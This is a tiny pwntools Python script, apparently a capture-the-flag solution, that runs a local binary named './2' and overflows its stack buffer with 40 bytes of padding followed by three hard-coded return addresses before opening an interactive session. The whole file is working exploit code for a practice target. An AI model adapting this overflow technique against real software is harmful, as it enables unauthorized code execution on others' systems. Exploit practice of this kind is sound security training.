from pwn import *

p = process("./2")
p.sendline(b'A'*40 + p64(0x401194) + p64(0x4011a5) + p64(0x401156))
p.interactive()